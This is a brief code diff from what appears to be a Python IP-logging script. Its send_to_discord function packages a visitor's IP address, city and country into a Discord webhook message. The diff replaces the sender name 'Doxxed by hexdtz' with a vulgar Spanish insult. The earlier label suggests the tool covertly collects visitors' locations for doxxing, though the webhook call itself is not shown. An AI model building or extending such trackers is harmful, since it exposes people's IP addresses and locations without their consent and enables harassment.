@@ -52,7 +52,7 @@ def send_to_discord(info):
     ip_city = f"{info['ip']} ({info['city'] or 'Unknown City'})"
 
     embed = {
-        "username": "Doxxed by hexdtz",
+        "username": "PUTA BARCA",
         "avatar_url": flag_url,
         "embeds": [{
             "title": f"🌍 Visitor From {info['country']}",
